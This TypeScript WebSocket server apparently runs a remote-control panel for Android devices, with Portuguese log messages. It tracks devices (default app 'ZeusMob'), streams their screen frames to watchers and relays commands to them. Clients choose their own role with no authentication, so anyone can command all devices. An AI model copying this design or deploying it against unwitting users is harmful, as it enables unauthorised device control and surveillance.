import { IncomingMessage } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { logger } from "../lib/logger.js";

interface WsClient {
  ws: WebSocket;
  role: string;
  deviceId?: string;
  ip: string;
}

interface DeviceEntry {
  deviceId: string;
  ip: string;
  app: string;
  online: boolean;
  lastSeen: number;
}

const clients        = new Set<WsClient>();
const deviceRegistry = new Map<string, DeviceEntry>();

function broadcastDeviceList() {
  const devices = [...deviceRegistry.values()];
  const msg = JSON.stringify({ type: "device_list", devices });
  for (const c of clients) {
    if (
      (c.role === "dashboard" || c.role === "status") &&
      c.ws.readyState === WebSocket.OPEN
    ) {
      c.ws.send(msg);
    }
  }
}

/** Relay a command from a watch/dashboard client to the target Android device */
function relayCommandToDevice(msg: Record<string, unknown>) {
  const targetId = (msg.targetDeviceId ?? msg.deviceId) as string | undefined;
  let relayed = 0;
  for (const c of clients) {
    if (
      c.role === "device" &&
      c.ws.readyState === WebSocket.OPEN &&
      (!targetId || c.deviceId === targetId)
    ) {
      c.ws.send(JSON.stringify(msg));
      relayed++;
    }
  }
  logger.info({ cmd: msg.cmd, targetId, relayed }, "Comando retransmitido para dispositivo(s)");
}

export function createWsServer(server: import("http").Server): WebSocketServer {
  const wss = new WebSocketServer({ server, path: undefined });

  wss.on("connection", (ws: WebSocket, req: IncomingMessage) => {
    const url      = new URL(req.url ?? "/", "http://localhost");
    const role     = url.searchParams.get("role") ?? "unknown";
    const deviceId = url.searchParams.get("deviceId") ?? undefined;
    const ip = (
      (req.headers["x-forwarded-for"] as string | undefined)
        ?.split(",")[0].trim()
      ?? req.socket.remoteAddress
      ?? "unknown"
    );

    logger.info({ role, deviceId, ip }, `Nova conexão WebSocket de: ${ip}`);

    const client: WsClient = { ws, role, deviceId, ip };
    clients.add(client);

    ws.send(JSON.stringify({ type: "welcome", role, deviceId }));

    if (role === "dashboard" || role === "status") {
      ws.send(JSON.stringify({ type: "device_list", devices: [...deviceRegistry.values()] }));
    }

    ws.on("message", (raw) => {
      let msg: Record<string, unknown>;
      try {
        msg = JSON.parse(raw.toString()) as Record<string, unknown>;
      } catch {
        // Binary frame (JPEG) — relay to watchers for this device
        if (deviceId && role === "device") {
          for (const c of clients) {
            if (
              c.role === "watch" &&
              c.deviceId === deviceId &&
              c.ws.readyState === WebSocket.OPEN
            ) {
              c.ws.send(raw);
            }
          }
        }
        return;
      }

      const evtType = ((msg.type ?? msg.event) as string | undefined) ?? "";

      // ── Device online ────────────────────────────────────────────
      if (evtType === "device_online") {
        const devId = (msg.deviceId as string | undefined) ?? deviceId ?? ip;
        deviceRegistry.set(devId, {
          deviceId: devId,
          ip,
          app:      (msg.app as string | undefined) ?? "ZeusMob",
          online:   true,
          lastSeen: Date.now(),
        });
        logger.info({ devId, ip, app: msg.app }, "Dispositivo ONLINE");
        broadcastDeviceList();
        ws.send(JSON.stringify({ type: "device_registered", deviceId: devId }));
        return;
      }

      // ── Stream control ───────────────────────────────────────────
      if (evtType === "start_stream" || evtType === "stop_stream") {
        logger.info({ deviceId: msg.deviceId, evtType }, "Stream control");
        ws.send(JSON.stringify({
          type: "stream_ack",
          status: evtType === "start_stream" ? "started" : "stopped",
          deviceId: msg.deviceId,
        }));
        return;
      }

      // ── JPEG frame relay ────────────────────────────────────────
      if (evtType === "frame" && msg.deviceId) {
        const srcId = msg.deviceId as string;
        for (const c of clients) {
          if (
            c.role === "watch" &&
            c.deviceId === srcId &&
            c.ws.readyState === WebSocket.OPEN
          ) {
            c.ws.send(raw);
          }
        }
        return;
      }

      // ── Command relay (web panel → Android device) ───────────────
      // Sent by role=watch or role=dashboard; forwarded to role=device
      if (evtType === "command") {
        relayCommandToDevice(msg);
        // Ack to sender
        ws.send(JSON.stringify({
          type: "command_ack",
          cmd:  msg.cmd,
          ok:   true,
        }));
        return;
      }

      // ── Status report from device back to watchers ───────────────
      if (evtType === "status_report" && deviceId && role === "device") {
        for (const c of clients) {
          if (
            c.role === "watch" &&
            c.deviceId === deviceId &&
            c.ws.readyState === WebSocket.OPEN
          ) {
            c.ws.send(JSON.stringify(msg));
          }
        }
        return;
      }
    });

    ws.on("close", () => {
      clients.delete(client);
      logger.info({ role, deviceId, ip }, "WS client desconectado");

      if (deviceId && role === "device") {
        const entry = deviceRegistry.get(deviceId);
        if (entry) {
          entry.online   = false;
          entry.lastSeen = Date.now();
          broadcastDeviceList();
          logger.info({ deviceId, ip }, "Dispositivo OFFLINE");
        }
      }
    });

    ws.on("error", (err) => {
      logger.error({ err, role, deviceId, ip }, "WS error");
    });
  });

  // Broadcast stats + device list every 5 s
  setInterval(() => {
    const statsMsg = JSON.stringify({ type: "stats", fps: 0, latencyMs: 0, batteryPct: 0 });
    for (const c of clients) {
      if (c.role === "watch" && c.ws.readyState === WebSocket.OPEN) {
        c.ws.send(statsMsg);
      }
    }
    broadcastDeviceList();
  }, 5000);

  return wss;
}
